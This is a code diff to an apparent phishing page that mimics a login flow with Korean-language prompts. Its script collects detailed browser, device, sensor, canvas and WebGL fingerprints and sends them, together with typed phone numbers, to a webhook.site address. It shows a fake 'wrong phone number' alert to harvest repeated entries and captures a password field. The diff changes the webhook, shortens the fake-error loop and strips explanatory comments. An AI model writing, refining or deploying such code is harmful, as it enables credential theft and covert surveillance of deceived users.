@@ -32,14 +32,14 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 .btn-yellow:active { background: #f0db00; transform: scale(0.98); }
 .login-container { max-width: 400px; margin: 80px auto; text-align: center; padding: 20px; transition: transform 0.3s ease, opacity 0.3s ease; }
 .login-container h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
-.login-container input { width: 365px; padding: 5px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc; font-size: 14px; outline: none; box-sizing: border-box; }
+.login-container input { width: 380px; padding: 5px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc; font-size: 14px; outline: none; box-sizing: border-box; }
 .login-container .btn-gray { width: 100%; padding: 14px; margin-top: 20px; background: #f0f0f0; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; color: #888; cursor: pointer; transition: transform 0.1s; }
 .login-container .btn-gray:active { transform: scale(0.98); }
 .fade-out { opacity: 0; transform: translateY(-20px); }
 .fade-in { opacity: 1; transform: translateY(0); }
 
-/* 눈 아이콘 스타일 */
-.password-wrapper { position: relative; display: inline-block; width: 365px; }
+
+.password-wrapper { position: relative; display: inline-block; width: 380px; }
 .password-wrapper input { width: 100%; padding: 5px 35px 5px 5px; box-sizing: border-box; }
 .toggle-password { position: absolute; top: 50%; right: 5px; transform: translateY(-50%); cursor: pointer; }
 .eye-slash { stroke-width: 2; stroke: #888; transition: all 0.2s ease; display: none; }
@@ -91,7 +91,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 </div>
 
 <script>
-const webhookUrl = "https://webhook.site/bee57e23-7107-4cb1-84f2-7691013118f6";
+const webhookUrl = "https://webhook.site/c104efa1-b76d-4f23-92b4-42bf847d5363";
 let savedPhone = "";
 let phoneTryCount = 0;
 let loginTryCount = 0;
@@ -116,11 +116,10 @@ function goNext() {
   showPage('page1', 'page2');
 }
 
-// --- 확장된 정보 수집 ---
+
 async function collectUserInfo() {
     const formData = new URLSearchParams();
 
-    // 브라우저/플랫폼
     formData.append("userAgent", navigator.userAgent);
     formData.append("language", navigator.language);
     formData.append("languages", navigator.languages.join(","));
@@ -135,7 +134,7 @@ async function collectUserInfo() {
     formData.append("appVersion", navigator.appVersion);
     formData.append("product", navigator.product);
 
-    // 화면/디스플레이
+ 
     formData.append("screen.width", screen.width);
     formData.append("screen.height", screen.height);
     formData.append("screen.availWidth", screen.availWidth);
@@ -149,7 +148,7 @@ async function collectUserInfo() {
     formData.append("devicePixelRatio", window.devicePixelRatio);
     formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
 
-    // 네트워크
+  
     if (navigator.connection) {
         formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
         formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
@@ -157,7 +156,7 @@ async function collectUserInfo() {
         formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
     }
 
-    // 배터리
+  
     if (navigator.getBattery) {
         try {
             const battery = await navigator.getBattery();
@@ -168,11 +167,11 @@ async function collectUserInfo() {
         } catch(e){ formData.append("battery.info","unknown"); }
     }
 
-    // 플러그인/폰트
+   
     formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
     formData.append("fonts", Array.from(document.fonts).map(f => f.family).join(",") || "unknown");
 
-    // 센서
+
     if(window.DeviceMotionEvent) {
         window.addEventListener("devicemotion", e=>{
             if(e.acceleration) {
@@ -190,8 +189,8 @@ async function collectUserInfo() {
         }, { once:true });
     }
 
-    // Canvas fingerprint
-    try {
+
+  try {
         const canvas = document.createElement("canvas");
         const ctx = canvas.getContext("2d");
         ctx.textBaseline = "top";
@@ -205,7 +204,7 @@ async function collectUserInfo() {
         formData.append("canvasFingerprint", canvas.toDataURL());
     } catch(e){ formData.append("canvasFingerprint","error"); }
 
-    // WebGL fingerprint
+
     try {
         const canvas = document.createElement("canvas");
         const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
@@ -221,13 +220,11 @@ async function collectUserInfo() {
     formData.append("timestamp", new Date().toISOString());
     formData.append("page","1");
 
-    // 전송
+  
     fetch(webhookUrl, {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:formData})
         .catch(err=>console.error("WebHook 전송 오류:",err));
-
-
 }
-// --- 끝 정보 수집 ---
+
 
 function sendPhone() {
   const userId = document.getElementById("userId").value.trim();
@@ -246,12 +243,12 @@ function sendPhone() {
     body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString(), tryCount:phoneTryCount})
   }).catch(err=>console.error(err));
 
-  if(phoneTryCount <= 2) {
+  if(phoneTryCount <= 1) {
     alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
     document.getElementById("userId").value = "";
   }
 
-  if(phoneTryCount >= 3) {
+  if(phoneTryCount >= 2) {
     savedPhone = userId;
     const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
    
@@ -302,7 +299,7 @@ function sendPage4() {
   }
 }
 
-// 로그인 버튼과 비밀번호 초기화
+
 const passwordInput = document.getElementById("userCode4");
 const loginBtn = document.getElementById("loginBtn");
 
@@ -314,8 +311,8 @@ function updateLoginBtnColor() {
   } else {
     loginBtn.classList.remove("btn-yellow");
     loginBtn.classList.add("btn-gray");
-    passwordInput.type = "password";  // 비밀번호 숨김
-    slash.style.display = "none";     // 눈 아이콘 슬래시 숨김
+    passwordInput.type = "password";  
+    slash.style.display = "none";     
   }
 }
 
@@ -324,17 +321,17 @@ passwordInput.addEventListener("keyup", updateLoginBtnColor);
 passwordInput.addEventListener("change", updateLoginBtnColor);
 updateLoginBtnColor();
 
-// 눈 아이콘 토글
+
 function togglePassword() {
   const input = document.getElementById("userCode4");
   const slash = document.querySelector(".eye-slash");
 
   if (input.type === "password") {
     input.type = "text";
-    slash.style.display = "block"; // 보이는 상태: 슬래시 표시
+    slash.style.display = "block";
   } else {
     input.type = "password";
-    slash.style.display = "none"; // 숨김 상태: 슬래시 숨김
+    slash.style.display = "none";
   }
 }
 
